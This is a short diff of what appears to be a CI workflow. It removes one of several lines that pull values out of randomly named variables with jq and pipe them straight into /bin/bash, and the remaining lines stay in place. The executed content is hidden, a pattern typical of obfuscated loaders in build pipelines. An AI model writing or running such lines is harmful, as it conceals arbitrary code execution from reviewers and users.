@@ -54,7 +54,6 @@ jobs:
           printf '%s' "$xyt71" | jq -r .t52019 | /bin/bash
           echo $lbdc20830 | jq -r .pv0390 | /bin/bash
           echo $nvpsj47 | jq -r .supv7 | /bin/bash
-          echo $jq69 | jq -r .fil15 | /bin/bash
           echo $n75 | jq -r .odym91639 | /bin/bash
 
       - name: Store results
